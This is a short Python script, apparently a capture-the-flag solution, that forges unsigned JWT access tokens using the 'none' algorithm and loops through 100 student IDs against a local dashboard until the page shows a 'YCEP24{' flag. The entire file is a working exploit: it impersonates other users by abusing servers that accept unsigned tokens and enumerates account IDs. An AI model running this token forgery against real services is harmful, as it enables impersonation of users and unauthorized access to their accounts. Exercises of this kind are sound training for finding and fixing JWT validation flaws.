import jwt
import requests


def gen( student_id: int ) -> str:
    payload = {
        "fresh": False,
        "iat": 1714112288,
        "jti": "68cb5d0e-1a0d-456c-8d86-97b8560cdac7",
        "type": "access",
        "sub": f"P{student_id}",
        "nbf": 1714112288,
        "csrf": "ff87544a-07f5-4c11-aa3f-182d77428aa7",
        "exp": 1714113188
    }

    headers = { "alg": "none", "typ": "JWT" }
    return jwt.encode( payload, key = None, algorithm = "none", headers = headers )


def main():
    base_url = "http://127.0.0.1:5000/dashboard"
    base_id = 230000
    range_size = 100

    for i in range( range_size ):
        token = gen( base_id + i )
        cookies = { "access_token": token }
        response = requests.get( base_url, cookies = cookies )

        if "YCEP24{" in response.text:
            print( response.text )
            break
    else:
        print( "wtf?" )


if __name__ == "__main__":
    main()
